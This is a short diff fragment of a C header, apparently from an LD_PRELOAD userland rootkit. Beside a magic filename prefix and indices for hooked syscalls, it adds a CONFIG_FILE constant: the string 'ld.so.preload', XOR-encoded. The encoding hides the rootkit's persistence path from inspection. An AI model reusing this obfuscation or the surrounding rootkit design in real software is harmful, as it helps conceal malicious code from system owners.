@@ -8,6 +8,7 @@
 #endif
 
 #define MAGIC_STRING	"__"
+#define CONFIG_FILE	"\x92\x9a\xd0\x8d\x91\xd0\x8e\x8c\x9b\x92\x91\x9f\x9a"
 
 #define SYS_ACCESS 0
 #define SYS_READDIR 1
